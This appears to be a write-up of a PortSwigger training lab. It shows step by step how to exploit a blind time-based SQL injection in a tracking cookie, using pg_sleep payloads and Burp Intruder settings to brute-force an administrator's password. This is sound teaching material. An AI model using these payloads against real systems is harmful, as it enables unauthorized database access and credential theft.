## Lab Description: 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/99b06c8f-6a14-4dfb-9305-6eb52fa89c97)

## Solution:
Confirm that blind sql injection works -

Modify the cookie value
```sql
TrackingId=x'||pg_sleep(10)--
```
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4feb3aad-42eb-49bb-920b-c8b2287e05be)
```sql
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

We get response after 10 sec delay, which confirms the blind SQL injection vulnerability

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/1a2a4a82-64cb-4307-bdb2-112bf370d9c4)

Change the boolean condition (1=2) to verify it
```sql
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
We get a response immediately which means the condition failed (1=2)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8f07eb2e-6399-4ef0-9644-4d98af981e65)

### Verify administrator user exists -
```sql
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
It takes 10 sec to respond which means there is indeed a user called administrator
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a18412d1-f760-407e-a434-e95c57f483ca)

### Find the length of admin's password -

To determine how many characters are in the password of the administrator user. To do this, change the value to:

The below payload checks if the length is > 1.

```sql
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/5f10634a-49da-4049-b04b-3e3bd7abaaca)

It takes 10 sec delay to respond which means it is > 1 character.

Automate this process,

    Send the req to intruder
    Add length of password part as payload (>1)
    Payload type - Sniper
    Payload - Numbers (1 to 50 with step 1)

Add an extra column called Response Received to show the response time of each request.

At a payload 20 , the delay of response does not happen, means the length of password is 20 characters

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ba0aa978-dc77-4e71-b073-4ab417e2f093)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/cd0f9225-d126-41db-9f7b-f158c70eb66c)

Bruteforce the admin's password -

To bruteforce the password, we use a payload where we take first letter of the password and try to match it with all alphabets and numbers. If it matches then we get a 10 sec delay.

TrackingId=x'%3BSELECT+CASE+WHEN (username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Automate this

    Add the part which replaces the first character (1,1) as payload 1.
    Add the character to be matched against ('a') as payload 2.
    Attack type - Cluster Bomb
    Payload 1 - Numbers (1 to20 with step 1)
    Payload 2 - Bruteforcer (min & max length as 1)

Once we get the result, we can segregate the result and get the password like before, since we can't arrange both response received and payload1 together.

So,

Highlight the requests which has 10 sec delay.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/77ee3888-7e55-4600-9b9d-e6f696889926)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e577c940-1e35-49b7-b89f-f325cd359070)

username: `administrator` password: `5r3t0e5zimvzomd1x0tt`

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/81854452-9c57-4824-a503-2765e898a117)


